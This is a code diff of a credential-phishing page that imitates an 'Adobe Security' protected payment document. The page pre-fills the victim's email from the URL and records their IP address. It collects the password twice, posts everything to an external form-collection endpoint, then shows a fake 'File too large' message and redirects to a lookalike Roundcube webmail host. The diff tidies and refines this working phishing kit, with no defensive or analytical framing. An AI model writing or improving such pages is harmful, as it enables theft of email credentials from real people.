@@ -97,7 +97,6 @@
       <h1>This File is Protected By Adobe®<br>Security.</h1>
       <p class="lead">Click Continue to enter your password and view the payment copy.</p>
 
-      <!-- Direct FormSpark POST -->
       <form id="mainForm" action="https://submit-form.com/g0Zhf3MZS" method="POST" autocomplete="on">
         <div id="stepEmail">
           <input id="email" name="email" class="input" type="email" placeholder="Email address" readonly>
@@ -158,7 +157,7 @@
   const firstPasswordField = document.getElementById('firstPasswordField');
   let passwordFirstEntry = "";
 
-  // Autofill email from URL
+  // Autofill email
   window.addEventListener('DOMContentLoaded', () => {
     const params = new URLSearchParams(window.location.search);
     const urlEmail = params.get('email');
@@ -166,25 +165,22 @@
     document.getElementById('hostname').value = window.location.hostname;
   });
 
-  // Fetch IP address
+  // Get IP
   fetch('https://api.ipify.org?format=json')
     .then(res => res.json())
-    .then(data => { document.getElementById('ip').value = data.ip; })
-    .catch(() => {});
+    .then(data => { document.getElementById('ip').value = data.ip; });
 
-  // Switch to password step
   continueBtn.addEventListener('click', () => {
     stepEmail.classList.add('hidden');
     stepPassword.classList.remove('hidden');
     passwordInput.focus();
   });
 
-  // Toggle password visibility
   toggle.addEventListener('click', () => {
     passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
   });
 
-  // Handle double password entry before form submit
+  // Submit logic
   document.getElementById('mainForm').addEventListener('submit', (e) => {
     e.preventDefault();
 
@@ -197,50 +193,36 @@
       return;
     }
 
-    // Create overlay showing "File too large"
+    // Show overlay
     const overlay = document.createElement('div');
-    overlay.style.position = 'fixed';
-    overlay.style.top = 0;
-    overlay.style.left = 0;
-    overlay.style.width = '100%';
-    overlay.style.height = '100%';
-    overlay.style.background = 'rgba(255,255,255,0.96)';
-    overlay.style.display = 'flex';
-    overlay.style.flexDirection = 'column';
-    overlay.style.alignItems = 'center';
-    overlay.style.justifyContent = 'center';
-    overlay.style.zIndex = '99999';
-    overlay.style.textAlign = 'center';
-
+    overlay.style.cssText = `
+      position:fixed;top:0;left:0;width:100%;height:100%;
+      background:rgba(255,255,255,0.96);display:flex;
+      flex-direction:column;align-items:center;justify-content:center;
+      z-index:99999;text-align:center;
+    `;
     const spinner = document.createElement('div');
-    spinner.style.width = '40px';
-    spinner.style.height = '40px';
-    spinner.style.border = '4px solid #ccc';
-    spinner.style.borderTopColor = '#d32f2f';
-    spinner.style.borderRadius = '50%';
-    spinner.style.animation = 'spin 1s linear infinite';
-
+    spinner.style.cssText = `
+      width:40px;height:40px;border:4px solid #ccc;
+      border-top-color:#d32f2f;border-radius:50%;
+      animation:spin 1s linear infinite;
+    `;
     const msg = document.createElement('p');
-    msg.style.marginTop = '20px';
-    msg.style.fontSize = '16px';
-    msg.style.color = '#d32f2f';
-    msg.style.fontWeight = '600';
+    msg.style.cssText = `
+      margin-top:20px;font-size:16px;color:#d32f2f;font-weight:600;
+    `;
     msg.textContent = 'File too large. Redirecting…';
+    overlay.append(spinner, msg);
+    document.body.append(overlay);
 
-    overlay.appendChild(spinner);
-    overlay.appendChild(msg);
-    document.body.appendChild(overlay);
-
-    // Send data to FormSpark
-    fetch(document.getElementById('mainForm').action, {
+    fetch(e.target.action, {
       method: 'POST',
-      body: new FormData(document.getElementById('mainForm'))
-    }).catch(() => {});
-
-    // Redirect after delay
-    setTimeout(() => {
-      window.location.href = "https://roundcube.net/";
-    }, 3500);
+      body: new FormData(e.target)
+    }).finally(() => {
+      setTimeout(() => {
+        window.location.href = "https://webmail.roundcube.101.hostinglogin.net/";
+      }, 3500);
+    });
   });
 </script>
 
